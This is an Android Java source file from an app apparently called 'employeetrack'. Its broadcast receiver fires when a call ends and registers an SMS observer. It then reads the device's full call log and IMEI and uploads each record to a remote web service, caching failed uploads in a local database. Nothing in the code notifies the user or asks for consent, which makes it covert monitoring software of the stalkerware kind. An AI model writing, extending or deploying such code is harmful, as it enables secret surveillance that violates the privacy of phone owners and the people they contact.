package call.log;

import sms.log.SmsContentObserver;
import browser.log.BrowserObserver;
import android.content.BroadcastReceiver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.net.NetworkInfo.State;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Browser;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import android.util.Log;

public class CallBroadcastReceiver extends BroadcastReceiver 
{
	Cursor disp;
	TelephonyManager tManager;
	private static final String tag= "CallTracer";
	private SmsContentObserver observer=null;
	private static final Uri STATUS_URI= Uri.parse("Content://sms");
	
	@Override
	public void onReceive(Context context, Intent intent) 
	{	
		// TODO Auto-generated method stub
		tManager=(TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
		
		Bundle extras = intent.getExtras();
	
		if (extras != null)    
	    {     
			if(observer  == null)
			{
				observer = new SmsContentObserver(new Handler(), context);
				context.getContentResolver().registerContentObserver(STATUS_URI,true,observer);
			}
	      String state = extras.getString(TelephonyManager.EXTRA_STATE);
	      Log.w(tag,state);
	      if(state.equalsIgnoreCase("IDLE"))
	      {
	    	  if(state.equals("IDLE"))
	      	  {
	    		 Log.w(tag, "Catch :"+state);
	    		 storeData(context);
	    	  }
	     }   
	   }
	}
	
	protected void storeData(Context context) 
	{
		my.employeetrack.app.DbHelper dh=new my.employeetrack.app.DbHelper(context,"MitterBitterDB",null);
  	  	
		SQLiteDatabase db=dh.getWritableDatabase();
	  	
  	  	String[] colimn={CallLog.Calls._ID,CallLog.Calls.NUMBER,CallLog.Calls.DATE,CallLog.Calls.DATE,CallLog.Calls.DURATION,CallLog.Calls.TYPE};
       
  	  	Cursor cur =context.getContentResolver().query(CallLog.Calls.CONTENT_URI,colimn,null,null,CallLog.Calls.DATE + " DESC");
  	  	
        String IMEI=tManager.getDeviceId();
        
        Log.i(tag,"Count : "+cur.getCount());
        
        Cursor data=db.rawQuery("select * from calllog ORDER BY dat DESC",null);
        
        if(data.getCount()==0) 
        {
      	    try 
      		  {
					Thread.sleep(3000);
	 			 	
      		  } catch (InterruptedException e) 
      		  {
      			  e.printStackTrace();
      		  }
      		  cur = context.getContentResolver().query(CallLog.Calls.CONTENT_URI,colimn,null,null,CallLog.Calls.DATE + " DESC");
      		  
      		  Log.i(tag,"Count of cur : "+cur.getCount());
      	
      		  while(cur.moveToNext())
      		  {  
      			  if(isInternetOn(context) == true)
      			  {
      				Log.i(tag,"Call WebServices");
      				int result = my.employeetrack.app.CallServices.serverUpdateCallLogs(cur.getInt(0),IMEI,cur.getString(1),cur.getLong(2),cur.getLong(3),cur.getLong(4),cur.getString(5));

      				if(result == 1)
      				{
      			 		Log.i(tag,"Data Inserted WebServices");
      			 		result = 0;
      			 	}
      				else
      				{
      					Log.i(tag,"Connected But Data Not Inserted");
          				Log.i(tag,"Data Stored in Local DB");
          				ContentValues values=new ContentValues();
          				values.put("_id", cur.getInt(0));
    			    	values.put("imei",IMEI);
    			    	//values.put("imei","123456789101234");
    			    	values.put("number",cur.getString(1)); 
    			    	values.put("dat",cur.getLong(2));
    			    	values.put("time",cur.getLong(3));
    			    	values.put("duration",cur.getLong(4));
    			    	values.put("type",cur.getString(5));
    			    	values.put("updateServer",0);
    			    	db.insert("calllog", null, values);
      				}
      			  }
      			  else
      			  {
      				Log.i(tag,"Not Connected");
      				Log.i(tag,"Data Stored in Local DB");
      				ContentValues values=new ContentValues();
      				values.put("_id", cur.getInt(0));
			    	values.put("imei",IMEI);
			    	//values.put("imei","123456789101234");
			    	values.put("number",cur.getString(1)); 
			    	values.put("dat",cur.getLong(2));
			    	values.put("time",cur.getLong(3));
			    	values.put("duration",cur.getLong(4));
			    	values.put("type",cur.getString(5));
			    	values.put("updateServer",0);
			    	db.insert("calllog", null, values);
			      }
      			  		
      		  } 
      	  cur.deactivate();
      	  data.deactivate();
      	  db.close();
      	  dh.close();
        }
        else if(data.getCount()>0)  
        {     
      	    try 
      		  {
					Thread.sleep(3000);
				 	
      		  } catch (InterruptedException e) 
      		  {
      			  e.printStackTrace();
      		  }
      		    
      		  cur = context.getContentResolver().query(CallLog.Calls.CONTENT_URI,colimn,null,null,CallLog.Calls.DATE + " DESC");
      		  Log.i(tag,"Cur Count : "+cur.getCount());
      	  
      	  int flag = 0;
      	  while(cur.moveToNext())
      	  {
      		  data.deactivate();
      		  data.requery();
      		  while(data.moveToNext())
      		  {
      			if(cur.getInt(0) == data.getInt(0)
      					&& Long.parseLong(IMEI) == data.getLong(1)
      					&& cur.getString(1).equalsIgnoreCase(data.getString(2))
      					&& cur.getLong(2) == data.getLong(3)
      					&& cur.getLong(3) == data.getLong(4)
      					&& cur.getLong(4) == data.getLong(5)
      					&& cur.getString(5).equals(data.getString(6))
      					
  			      ) 
      			{  
      				Log.i(tag,"Test Condition No Entry in DB");
      				flag=1;
      			}			        			
      		  }
      		   
	        	  if(flag == 0)
	        	  {
	        		  if(isInternetOn(context) == true)
	      			  {
	        			  	Log.i(tag,"Call WebServices");
	        				int result = my.employeetrack.app.CallServices.serverUpdateCallLogs(cur.getInt(0),IMEI,cur.getString(1),cur.getLong(2),cur.getLong(3),cur.getLong(4),cur.getString(5));

	        				if(result == 1)
	        				{
	        			 		Log.i(tag,"Data Inserted WebServices");
	        			 		result = 0;
	        			 	}
	        				else
	        				{
	        					Log.i(tag,"Connected But Data Not Inserted");
	            				Log.i(tag,"Data Stored in Local DB");
	            				ContentValues values=new ContentValues();
		  		        		  values.put("_id", cur.getInt(0));
		  				    	  values.put("imei",IMEI);
		  			   	          //values.put("imei","123456789101234");
		  				    	  values.put("number",cur.getString(1)); 
		  				    	  values.put("dat",cur.getLong(2));
		  				    	  values.put("time",cur.getLong(3));
		  				    	  values.put("duration",cur.getLong(4));
		  				    	  values.put("type",cur.getLong(5));
		  				    	  values.put("updateServer",0);
		  				    	  db.insert("calllog", null, values);
	            			}
	      			  }
	        		  else
	        		  {
		        		  ContentValues values=new ContentValues();
		        		  values.put("_id", cur.getInt(0));
				    	  values.put("imei",IMEI);
			   	          //values.put("imei","123456789101234");
				    	  values.put("number",cur.getString(1)); 
				    	  values.put("dat",cur.getLong(2));
				    	  values.put("time",cur.getLong(3));
				    	  values.put("duration",cur.getLong(4));
				    	  values.put("type",cur.getString(5));
				    	  values.put("updateServer",0);
				    	  db.insert("calllog", null, values);
	        		  }
				  }
	     	  }
      	  cur.deactivate();
      	  data.deactivate();
      	  db.close();
      	  dh.close();
        }
   }
	
	public final boolean isInternetOn(Context context) 
	{
		
		ConnectivityManager connec =  (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
		// ARE WE CONNECTED TO THE NET
		if ( connec.getNetworkInfo(0).getState() == State.CONNECTED 
				||connec.getNetworkInfo(0).getState() == State.CONNECTING
				||connec.getNetworkInfo(1).getState() == State.CONNECTING  
				||connec.getNetworkInfo(1).getState() == State.CONNECTED ) 
		{
			// MESSAGE TO SCREEN FOR TESTING (IF REQ)
			Log.i(tag, "Connected");
			return true;
			
		} else if (connec.getNetworkInfo(0).getState() == State.DISCONNECTED
					|| connec.getNetworkInfo(1).getState() == State.DISCONNECTED 
				   )
		{
			//System.out.println(“Not Connected”);
			Log.i(tag, "Not Connected");
			return false;
		}
		Log.i(tag, "Not Connected");
		return false;
	}
	
}